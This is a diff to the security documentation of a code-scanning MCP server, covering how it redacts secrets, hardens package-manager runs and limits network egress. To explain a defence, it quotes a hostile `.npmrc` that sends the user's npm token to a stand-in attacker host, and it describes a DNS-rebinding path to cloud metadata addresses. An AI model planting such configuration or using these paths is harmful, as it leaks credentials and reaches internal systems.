@@ -71,9 +71,15 @@ their respective projects.
 - **Secrets stay redacted.** gitleaks runs with `--redact`; a credential
   finding's snippet is cleared before it is stored, and cleared again before an
   exported report, a GitHub issue or the dashboard shows it. `suggest_fix`
-  never reads a credential finding's file back. The one exception is opt-in:
+  never reads a credential finding's file back, and in the source it quotes
+  around any other finding it withholds every line a credential finding of
+  the project points at and every line the hooks' secret detector finds one
+  on (`redacted_lines`), as the LLM scan's briefs do. The one exception is opt-in:
   `verify_live` (below) reads the value from a private temporary report, sends
-  it only to its own provider, and deletes the report.
+  it only to its own provider, and deletes the report. The CLI gate also reads
+  values back, to tell a secret that moved from a new one, but only in memory:
+  each is HMAC'd under a key the process draws once, and neither the value nor
+  its HMAC is stored or printed (`mcp/src/ci/secretValues.ts`).
 - **A project cannot switch the protective hooks off.** In a project's
   `.guardian/hooks.config.json`, `enabled: false`, `bash.block: false` and
   `bash.warn: false` are ignored (SessionStart tells the model so), and there is
@@ -240,8 +246,10 @@ their respective projects.
   out of the project — is named as such: pip may take its sources from it),
   a file at one of these paths that is a link, a FIFO or a directory
   ("present, not checked"), `NuGet.config`, the .NET build's `.editorconfig`,
-  `.globalconfig` and `Directory.Build.props` / `.targets`, and quality_check's
-  ruff, jscpd, radon, staticcheck and ESLint configurations. `.guardianignore`
+  `.globalconfig` and `Directory.Build.props` / `.targets`, quality_check's
+  ruff, jscpd, radon, staticcheck and ESLint configurations, shellcheck's root
+  `.shellcheckrc`, detekt's `config/detekt/detekt.yml` or `detekt.yml`, and
+  cppcheck's `compile_commands.json` or `build/compile_commands.json`. `.guardianignore`
   is named on every run of a scan it shapes.
 - **A pull request does not choose its own gate.** On a pull request, the
   checkout's `.guardian/baseline.json`, Semgrep rules and ignore files are the
@@ -255,7 +263,13 @@ their respective projects.
   to the base's in the disposable CI checkout (`--reset-exclusions-from`,
   refused anywhere else); actionlint's and zizmor's configuration and the .NET
   build's files are named in the report whenever the pull request changes
-  them. The pipeline file itself runs from the
+  them. Under a ref the gate never builds the pull request's tree: a .NET
+  restore and build would run its MSBuild (`<Exec>` tasks, its packages'
+  analyzers and source generators) inside the gate job, where it could replace
+  a scanner or rewrite a report before the gate reads it — so the .NET
+  analyzers are a named gap and the gate exits 2, unless the command line
+  passes `--build-pr` for a pull request you trust (argv only: a
+  `.guardian/ci.json` declaring it is refused). The pipeline file itself runs from the
   pull request's branch on every host: it needs a required review
   ([docs/ci.md](docs/ci.md#a-pull-request-cannot-gate-itself)).
 - **What `install_toolchain` installs is pinned, and checked before it
@@ -287,8 +301,15 @@ their respective projects.
   installer was already pinned this way. A test holds the Linux script and
   the macOS script's Trivy to the catalogue's versions and sums.
 - **Least privilege.** The MCP server reads and writes within the target project
-  and its `.guardian/` directory, plus the temporary directories and user cache
-  listed in [mcp/README.md](mcp/README.md#what-the-server-writes).
+  and its `.guardian/` directory, plus the temporary directories, the per-user
+  data directory and cache listed in
+  [mcp/README.md](mcp/README.md#what-the-server-writes). Outside them it writes
+  only when asked: `install_toolchain` installs to `~/.local/bin` and
+  `~/.local/lib/dev-guardian/` (or through the system's package manager), and
+  `mcp-config --write --global` writes the host configs it names. It reads
+  user-level host configs (`~/.claude.json` and the others in
+  [docs/hosts.md](docs/hosts.md)) only for `audit_agent_config` and
+  `audit_mcp_tools` with `include_user_config`.
 - **The scanned repository's files are hostile input.** A clone, an archive or
   a pull request chooses what is at every path in it — a link, a junction, a
   FIFO, a device, a file of any size — and the server acts on it at startup,
@@ -443,9 +464,13 @@ their respective projects.
     when the git on `PATH` does not read `GIT_CONFIG_COUNT` (older than 2.31).
     What a run did not apply is named: `review_pr`'s warnings, the gitleaks
     history pass's reason, `create_fix_pr`'s `git_config_not_applied`.
-  - **Limits.** Not hardened: the test command `create_fix_pr` runs and the
-    application the DAST gate starts — both are the project's own code, run by
-    design; `precommit_install` keeps every override but the hooks redirect
+  - **Limits.** Not hardened: the test command `create_fix_pr` runs, the
+    application the DAST gate starts, and the project's own ESLint
+    (`node_modules/eslint/bin/eslint.js` with its `eslint.config.js`), which
+    `quality_check` — and `audit_executive` through it — runs when the project
+    configures and installs one — all the project's own code, run by design
+    (ESLint and the test command with the allowlisted environment described
+    below); `precommit_install` keeps every override but the hooks redirect
     (installing hooks where git says they go is its job; pre-commit's own git
     calls are `rev-parse` and `config`). A filter or textconv driver defined
     in YOUR configuration (git-lfs) still runs when the repository maps a
@@ -508,6 +533,21 @@ their respective projects.
   was started with reaches it. It is still the repository's code, running as
   you, with your files: run `create_fix_pr` only on a repository whose tests
   you would run yourself.
+- **WP-CLI boots the site it audits — without its plugins and theme.**
+  `wp_audit` (every mode), `wp_report`'s plugin kind and `wp_vuln_check` with
+  an install path run WP-CLI, which runs the site's PHP to answer from its
+  database. Every call passes `--skip-plugins --skip-themes`, names the site
+  with `--path` and starts in a temporary directory of its own holding an
+  empty `wp-cli.yml` — so the site's `wp-cli.yml` / `wp-cli.local.yml`, whose
+  `require:` WP-CLI would load as PHP, is never read — and gets the test
+  command's allowlisted environment above plus `WP_CLI_*`, `PHPRC`,
+  `PHP_INI_SCAN_DIR` and the proxy variables (`mcp/src/wordpress/wpCli.ts`).
+  What WP-CLI cannot skip still runs: the site's `wp-config.php` (`wp config
+  get` evaluates it too), its WordPress core files, its must-use plugins and
+  its drop-ins (`wp-content/db.php`, `object-cache.php`,
+  `advanced-cache.php`). On a site copied off a compromised server those may
+  be altered too: read its code first (`scan_wordpress`), and run the WP-CLI
+  audits only on a copy you would let boot.
 - **A repository never chooses where `create_fix_pr`'s package managers send
   your credentials.** A repository `.npmrc` with `registry=https://attacker/`
   and `//attacker/:_authToken=${NPM_TOKEN}` made `npm outdated`, `npm ci`,
@@ -524,7 +564,7 @@ their respective projects.
   manager runs, named in the group's `package_config_set_aside`, and put back
   before anything is committed. Every package-manager process it runs, itself
   or through `deps_update_plan` and `deps_audit` (`npm`, `pip-audit`,
-  `composer`, `bundle`, `cargo`, `go`, `dotnet restore`), gets the test
+  `composer`, `cargo`, `go`, `dotnet restore`), gets the test
   command's allowlisted environment plus your own package-manager
   configuration: the `NPM_CONFIG_*`, `YARN_*`, `PIP_*`, `COMPOSER_*`,
   `CARGO_REGISTRIES_*`, `BUNDLE_*`, `NUGET_*`, `GOPROXY`-family and proxy
@@ -589,9 +629,24 @@ their respective projects.
   `npm install` fetched a tarball the lock placed on another host without
   any `Authorization` header, while the tarball on your own registry carried
   your token — npm scopes a token to the host it was configured for, and a
-  test holds `create_fix_pr` to it. Not covered: the scans a user runs
-  outside `create_fix_pr`, which keep their environment and the repository's
-  configuration.
+  test holds `create_fix_pr` to it. Composer runs with `--no-plugins` (a
+  plugin a committed `vendor/` holds activated on `composer outdated`, the
+  repository's `allow-plugins` letting it — measured), and `require` with
+  `--no-install`. Bundler never runs: every Bundler command, `bundle lock`
+  included, evaluates the Gemfile, which is Ruby code — a gem gets no step,
+  and its CVE is named in `unplanned`. **`deps_update_plan` called directly**
+  holds to the same rules without a disposable checkout: every package
+  manager gets the allowlisted environment above; `npm outdated` runs on a
+  copy of `package.json` and its lock files in a temporary directory, so the
+  repository's `.npmrc` is never read (named in `package_config_not_read`:
+  measured, it sent the server's `GITHUB_TOKEN` to the scoped registry it
+  named) and a network-path dependency is refused as above; `cargo outdated`
+  does not run where the repository has its own `.cargo/config.toml` (an
+  alias for `outdated`, a `rustc-wrapper`) or a `rust-toolchain` with a
+  `path`, in the project's directory or one above it up to the repository
+  root. Its .NET restore still runs the project's MSBuild code (see "Network
+  egress"). Not covered: `deps_audit` run outside `create_fix_pr`, which
+  keeps the server's environment and the repository's configuration.
 
 ## Network egress
 
@@ -613,7 +668,7 @@ project's own build and test commands.
 | `www.cisa.gov` (KEV catalog), `api.first.org` (EPSS) | `prioritize_findings` ★, `risk_score` ★, `create_fix_pr` ★ | at most once per 24 h per CVE and for the catalog; `guardian://cves/active` only reads the cache |
 | The secret's own provider: `api.github.com`, `gitlab.com`, `slack.com`, `api.stripe.com`, `api.openai.com`, `api.anthropic.com`, `registry.npmjs.org`, `api.sendgrid.com` | `scan_secrets` with `verify_live: true` ★ | **off by default**. Each secret goes only to its own provider's read-only identity endpoint (a fixed URL per rule, never a host from the repository), 5 s timeout, at most 4 in flight and 50 per scan; `security_scan_full` never verifies |
 | `www.wordfence.com`, `api.wordpress.org` | `wp_vuln_check` (`mode: "source"`) ★ | Wordfence only with `WORDFENCE_API_KEY`; the feed is cached for 24 h |
-| The target you name | `scan_dast` (loopback only unless `authorized_target: true`), `wp_vuln_check` (`mode: "rest"`), the CLI's DAST health check | per call |
+| The target you name | `scan_dast` (loopback only unless `authorized_target: true`), `wp_vuln_check` (`mode: "rest"`), the CLI's DAST health check | per call. `scan_dast` classifies the target by its URL alone and does **not pin the address a hostname resolves to**: every request (and nuclei) resolves it again, so a name you authorised that its DNS rebinds mid-scan — to `127.0.0.1`, `169.254.169.254`, an internal host — is probed there, the authenticated variant with your `Authorization` header. Give an IP literal as `base_url` where that matters. Redirects are never followed, by nuclei either |
 | The URL you name | `scan_skill` given an HTTP(S) or git URL | per call |
 | A remote MCP server you name — a URL entry, a UNC command, or the URL a proxy on the command line talks to | `audit_mcp_tools` with `allow_remote: true` (`initialize` and the list methods only) | per call; without `allow_remote` that server is skipped |
 
@@ -621,17 +676,17 @@ project's own build and test commands.
 
 | Destination | Who triggers it | When |
 | --- | --- | --- |
-| Semgrep registry (`semgrep.dev`) — rules download **and usage metrics to Semgrep Inc.** | `scan_sast` and `security_scan_full` (`--config=auto`), `review_pr`, `bug_hunt` (`p/r2c-bug-scan`, `p/security-audit`, optional language packs), `scan_wordpress` (`p/php`, `p/wordpress`), `audit_executive` (through `security_scan_full`, and `scan_wordpress` on a WordPress project), `init_project`'s first-pass status report (`semgrep --config=auto`, when a bash is available) | by default. Semgrep refuses `--config=auto` with metrics off, so `scan_sast`, `security_scan_full`, `review_pr`, `audit_executive` and the CLI's `--local-only` offer `local_only: true`: only rules on disk, `--metrics=off`, nothing sent to Semgrep's registry or metrics endpoint. `bug_hunt` and `scan_wordpress` have no local-only mode; `audit_executive` with `local_only` skips `scan_wordpress` and says so. Semgrep's `--metrics=auto` also sends metrics with local rules when you are logged in to Semgrep, which is how `map_attack_surface` can send them. What Semgrep collects: <https://semgrep.dev/docs/metrics>. `compliance_check` (RGPD pack) and `create_fix_pr`'s autofix always run with `--metrics=off`. |
+| Semgrep registry (`semgrep.dev`) — rules download **and usage metrics to Semgrep Inc.** | `scan_sast` and `security_scan_full` (`--config=auto`), `review_pr`, `bug_hunt` (`p/r2c-bug-scan`, `p/security-audit`, optional language packs), `scan_wordpress` (`p/php`, `p/wordpress`), `audit_executive` (through `security_scan_full`, and `scan_wordpress` on a WordPress project), `init_project`'s first-pass status report (`semgrep --config=auto`, when a bash other than WSL's is available), `create_fix_pr`'s re-scans (`scan_sast` with the original scan's `local_only`, `bug_hunt`'s packs) | by default. Semgrep refuses `--config=auto` with metrics off, so `scan_sast`, `security_scan_full`, `review_pr`, `audit_executive` and the CLI's `--local-only` offer `local_only: true`: only rules on disk, `--metrics=off`, nothing sent to Semgrep's registry or metrics endpoint. `bug_hunt` and `scan_wordpress` have no local-only mode; `audit_executive` with `local_only` skips `scan_wordpress` and says so. Semgrep's `--metrics=auto` also sends metrics with local rules when you are logged in to Semgrep, which is how `map_attack_surface` can send them. What Semgrep collects: <https://semgrep.dev/docs/metrics>. `compliance_check` (RGPD pack) and `create_fix_pr`'s autofix always run with `--metrics=off`. |
 | Semgrep's version check (`semgrep.dev`) | **disabled by dev-guardian**: every Semgrep run gets `SEMGREP_ENABLE_VERSION_CHECK=0` — native runs (`mcp/src/runners/semgrepRun.ts`), the Docker fallback's container (`-e`), `check_toolchain`'s `semgrep --version`, and `init_project`'s status script | never. Measured through a refusing proxy on 1.176.1: `semgrep --version`, and a scan with local rules and `--metrics=off`, each asked for `semgrep.dev` four times with a fresh home; with the variable, neither asked, and the scan's results were the same. |
-| The project's NuGet feeds, and its MSBuild code | `scan_sast` on a .NET project (`dotnet restore --locked-mode`, then `dotnet build`) — **even with `local_only: true`** — and so `security_scan_full`, `audit_executive`, the CLI `scan` and `create_fix_pr`'s re-scans; `deps_audit` (and `audit_executive`, which runs it) and `deps_update_plan` (`dotnet restore`, `dotnet list package`) | when the .NET SDK is installed: for `scan_sast`, whenever a root `.csproj` / `.fsproj` / `.sln` / `.slnx` is present; for `deps_audit` and `deps_update_plan`, for every `.sln` / `.csproj` they find. A restore and a build execute the project's own MSBuild targets. |
+| The project's NuGet feeds, and its MSBuild code | `scan_sast` on a .NET project (`dotnet restore --locked-mode`, then `dotnet build`) — **even with `local_only: true`** — and so `security_scan_full`, `audit_executive`, the CLI `scan` (under `--baseline-ref` / `--rules-ref` only with `--build-pr`) and `create_fix_pr`'s re-scans; `deps_audit` (and `audit_executive`, which runs it) and `deps_update_plan` (`dotnet restore`, `dotnet list package`) | when the .NET SDK is installed: for `scan_sast`, whenever a root `.csproj` / `.fsproj` / `.sln` / `.slnx` is present; for `deps_audit` and `deps_update_plan`, for every `.sln` / `.csproj` they find. A restore and a build execute the project's own MSBuild targets. |
 | The Go module proxy (`proxy.golang.org`, or the project's `GOPROXY`) and checksum database (`sum.golang.org`); a Go toolchain download | `scan_sast` on a Go project — gosec loads every package through `go list` — **even with `local_only: true`**, and so `security_scan_full`, `review_pr`, `audit_executive`, the CLI `scan` and `create_fix_pr`'s re-scans; `deps_audit` (govulncheck, which loads the packages the same way) | when gosec and Go are installed and a module's dependencies are not in the module cache; a `GOFLAGS` `-mod=mod` is run as `-mod=readonly`, so `go.mod` and `go.sum` are never rewritten. When `go.mod` names a newer Go and `GOTOOLCHAIN` allows it, `go` downloads that toolchain. With cgo files, `go list` runs the C compiler over them, as a build would. A warm module cache, a `vendor/` directory or `GOPROXY=off` keep it local; a dependency that cannot be loaded is a named partial gap (`Type error`), never a clean package. |
 | The Go vulnerability database (`vuln.go.dev`, run by Google) | `deps_audit` on a Go project (govulncheck, once per module), and `audit_executive` through it | when govulncheck and Go are installed; it reads the database's index and the entries of the vulnerabilities that concern the modules the project requires. An unreachable database fails that module's run, named, never a clean one. |
 | Docker registry (`semgrep/semgrep` image) | `scan_sast`, `map_attack_surface` | only when Semgrep is not installed and Docker is |
-| Trivy's vulnerability database and misconfiguration checks bundle | `scan_deps`, `deps_audit`, `scan_containers`, `scan_iac`, `review_pr`, `scan_wordpress`, `security_scan_full` and `audit_executive` (through them — **even with `local_only: true`**), `init_project`'s status report | when Trivy needs them and its local cache is stale; `scan_containers` may also pull the image it is given |
+| Trivy's vulnerability database and misconfiguration checks bundle | `scan_deps`, `deps_audit`, `scan_containers`, `scan_iac`, `review_pr`, `scan_wordpress`, `security_scan_full` and `audit_executive` (through them — **even with `local_only: true`**), `create_fix_pr`'s re-scans, `init_project`'s status report | when Trivy needs them and its local cache is stale; `scan_containers` may also pull the image it is given |
 | The image's registry, and Sigstore's public-good trust root (`tuf-repo-cdn.sigstore.dev`) — Rekor (`rekor.sigstore.dev`) only for a signature that carries no inclusion proof | `scan_containers` given an `image`, which runs cosign ★: `cosign triangulate` (to pin the digest), then `cosign download signature` and `cosign download attestation` without a signer, `cosign verify` with `signer_identity` + `signer_issuer` (Sigstore's trust root is fetched for `verify` only) — all of one image's calls within one deadline, `GUARDIAN_SCAN_TIMEOUT_MS` | per call, when cosign is installed; `GUARDIAN_OFFLINE=1` starts no cosign at all (`cosign` is then skipped and in `missing_tools`). cosign reads registry credentials from the Docker config, like Trivy, and keeps its trust root under `~/.sigstore`. It never signs, attests or pushes anything. The downloads that decide an absence run with cosign's `-d` request log, which is parsed, never stored or forwarded (go-containerregistry already writes `Authorization: <redacted>`; URL query strings — a CDN's signed URL — are cut from every reason, finding and log line): what is attached is the referrers index the registry itself generated, read from that log (never `cosign tree`, which prints a pusher's annotation as it finds it), and whether each referrer was served is the registry's own status for its manifest and bundle. Two registry faults cosign itself does not report. (1) A referrer whose manifest or bundle blob the registry fails to serve (a 5xx, a 429, a refusal, a transport error) is skipped in silence; dev-guardian reports it as unknown, never as unsigned or rejected — so too a referrer the log never shows fetched, and a log cut at its size cap. A bundle answered 200 whose body then breaks mid-transfer reads exactly like one that does not parse: an existence check downloads once more and, still without it, reports unknown; a verification, after its own re-run, rejects — and says the bundle was listed and served but cosign could not use it, not a bundle it can parse or a transfer that failed mid-body, to re-run if the registry was unstable. On a registry with no referrers API, the `sha256-<hex>` fallback tag that stands in for the index is written by whoever can push, not by the registry, and cosign is silent about anything there it cannot use: a tag the registry served that holds no index cosign reads, or an entry of it cosign never fetched, is nothing attached (it is read as go-containerregistry reads it, so what cosign did fetch from it is judged like any referrer); only the registry failing to serve the tag withholds. (2) A referrers API answering with no OCI index at all — an HTML 200, a 400, a 406 — is read by go-containerregistry as "no referrers API", and every signature and attestation attached as a referrer silently disappears — a signed image then reads unsigned (an existence check says absent; a verification reports a high "no signature" finding). No request fails, so neither cosign nor dev-guardian can report it. (An index served with a Content-Type other than exactly the OCI index type, which go-containerregistry ignores the same way, is seen: its body is in the log, and what it lists cosign never fetched is unknown.) |
 | Maven Central | Trivy, for a `pom.xml` (in the tools above, and `compliance_check`'s license scan) | when it resolves Maven dependencies — **even with `local_only: true`** under `audit_executive`; Trivy's `--offline-scan`, which dev-guardian does not pass, stops it |
 | Trivy's version check and anonymous usage telemetry (`check.trivy.dev`) | **disabled by dev-guardian**: every Trivy run gets `TRIVY_SKIP_VERSION_CHECK=true` and `TRIVY_DISABLE_TELEMETRY=true`, and a Trivy 0.63.0 or newer also `--skip-version-check --disable-telemetry` (`mcp/src/runners/trivyRun.ts`; `init_project`'s status script sets the two variables) | never. Measured through a refusing proxy on 0.69.3: only both settings together stop the request; each alone does not. Trivy before 0.63.0 has neither the check nor the flags. |
-| Package registries, through the package managers | `deps_audit` and `audit_executive`, which runs it (`npm audit`; `pip-audit`, which installs the requirements into a temporary virtualenv from PyPI, or from the index a requirements file names — named on the run) — **even with `local_only: true`**, `deps_update_plan` (`npm outdated`, `composer outdated`, `bundle outdated`, `go list -m -u`, `cargo outdated`), `create_fix_pr` (installs in its worktree with `--ignore-scripts` / `--no-scripts`) | per call |
+| Package registries, through the package managers | `deps_audit` and `audit_executive`, which runs it (`npm audit`; `pip-audit`, which installs the requirements into a temporary virtualenv from PyPI, or from the index a requirements file names — named on the run) — **even with `local_only: true`**, `deps_update_plan` (`npm outdated` on a copy of the manifests, `composer outdated --no-plugins`, `go list -m -u`, `cargo outdated`; never Bundler), `create_fix_pr` (installs in its worktree with `--ignore-scripts` / `--no-scripts --no-plugins`) | per call |
 | The project's own test command and whatever it fetches | `create_fix_pr` runs `npm test`, `pytest`, `cargo test` or `go test ./...` in its worktrees — the project's own code, with an allowlisted environment that carries no token or credential of the server's (see [Hardening posture](#hardening-posture)) — (`cargo` and `go` download the project's dependencies; `npm ci --ignore-scripts` runs first when there is a lock file) | only for a candidate fix, dry runs included |
 | nuclei's update check and templates | `scan_dast` with `use_nuclei` | nuclei's own automatic update check and template download are on by default; dev-guardian does not pass `-disable-update-check` |
 | Syft's update check (`toolbox-data.anchore.io`) | **disabled by dev-guardian**: every Syft run gets `SYFT_CHECK_FOR_APP_UPDATE=false`, and `-c` pointing at an empty file, so a repository's `.syft.yaml` cannot turn on Syft's network lookups either (`mcp/src/runners/syftRun.ts`) | never |
